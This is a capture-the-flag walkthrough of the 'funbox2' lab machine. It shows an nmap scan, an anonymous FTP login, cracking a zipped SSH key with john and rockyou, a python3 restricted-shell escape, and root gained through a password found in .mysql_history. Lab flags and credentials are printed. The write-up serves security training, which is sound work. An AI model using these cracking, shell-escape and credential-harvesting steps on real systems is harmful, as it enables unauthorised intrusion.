-> First I will start by scanning the machine 
```
┌──(root㉿kali)-[/home/astra]
└─# nmap -p- --min-rate 10000 -sV -Pn 192.168.243.107
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 20:47 WET
Nmap scan report for 192.168.243.107
Host is up (0.12s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.95 seconds
                                                                                                                    
┌──(root㉿kali)-[/home/astra]
└─# 

```
-> Here we see FTP port open, so I will login with anonymous user
```
┌──(root㉿kali)-[/home/astra]
└─# ftp 192.168.243.107
Connected to 192.168.243.107.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.243.107]
Name (192.168.243.107:astra): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.45.5 !
230-
230-The local time is: Sat Feb 25 20:49:40 2023
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||53220|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
226 Transfer complete
ftp> 
```
-> Login was successful, we found a bunch of files, I downloaded tom.zip  
-> Tom.zip had a password, and we can crack it with johntheripper, first I will convert zip to hash and then crack it
```
┌──(root㉿kali)-[/home/astra]
└─# zip2john tom.zip > tom.hash          
ver 2.0 efh 5455 efh 7875 tom.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
                                                                                                                    
                                                                                                                    
┌──(root㉿kali)-[/home/astra]
└─# john --wordlist=/home/astra/Documents/rockyou.txt tom.hash  
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iubire           (tom.zip/id_rsa)     
1g 0:00:00:00 DONE (2023-02-25 20:54) 50.00g/s 1228Kp/s 1228Kc/s 1228KC/s 123456..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```                                                                                                              
-> Annd boom, we have the password, now the zip file have an id_rsa that allows us to connect to tom ssh 
```
┌──(root㉿kali)-[~astra]
└─# ssh -i id_rsa tom@192.168.243.107
The authenticity of host '192.168.243.107 (192.168.243.107)' can't be established.
ED25519 key fingerprint is SHA256:ZBER3N78DusT56jsi/IGcAxcCB2W5CZWUJTbc3K4bZc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.243.107' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Feb 25 20:56:25 UTC 2023

  System load:  0.0               Processes:             160
  Usage of /:   74.7% of 4.37GB   Users logged in:       0
  Memory usage: 35%               IP address for ens256: 192.168.243.107
  Swap usage:   0%


30 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@funbox2:~$ 
```
-> Now I will look for the user flag
```
tom@funbox2:~$ ls
local.txt
tom@funbox2:~$ cat local.txt
2ba2d2df7db3c7a545dd36713f1a9bd4
tom@funbox2:~$ 
```
-> There we go, now we need to escalate privileges, doing the command "ls-la" I can see a hidden file called .mysql_history and when I try to see it..
```
tom@funbox2:~$ ls -la
total 40
drwxr-xr-x 5 tom  tom  4096 Feb 25 20:56 .
drwxr-xr-x 3 root root 4096 Jul 25  2020 ..
-rw------- 1 tom  tom     0 Oct 14  2020 .bash_history
-rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tom  tom  3771 Apr  4  2018 .bashrc
drwx------ 2 tom  tom  4096 Feb 25 20:56 .cache
drwx------ 3 tom  tom  4096 Jul 25  2020 .gnupg
-rw-r--r-- 1 tom  tom    33 Feb 25 20:46 local.txt
-rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history
-rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
drwx------ 2 tom  tom  4096 Jul 25  2020 .ssh
tom@funbox2:~$ cat .my-rbash: /dev/null: restricted: cannot redirect output
bash: _upvars: `-a2': invalid number specifier
-rbash: /dev/null: restricted: cannot redirect output
bash: _upvars: `-a0': invalid number specifier
-rbash: /dev/null: restricted: cannot redirect output
bash: _upvars: `-a2': invalid number specifier
-rbash: /dev/null: restricted: cannot redirect output
bash: _upvars: `-a0': invalid number specifier

cat: .my: No such file or directory
tom@funbox2:~$ 
```
-> I get an error, rbash or restricted shell, so I look for a bypass, looking around I found one! "python3 -c 'import os; os.system("/bin/sh");'"
```
tom@funbox2:~$ python3 -c 'import os; os.system("/bin/sh");'
$ cat .mysql_history
_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
$ 
```
-> And it works, now I found what looks like a password for tom, and I try it 
```
$ sudo su
[sudo] password for tom: 
root@funbox2:/home/tom# 
```
-> Now we look for the root flag
```
root@funbox2:/home/tom# ls
local.txt
root@funbox2:/home/tom# cd
root@funbox2:~# ls
flag.txt  proof.txt
root@funbox2:~# cat proof.txt 
cd26e3b7b38fe0af10d6f4564358c152
root@funbox2:~# 
```
-> It was an easy one!
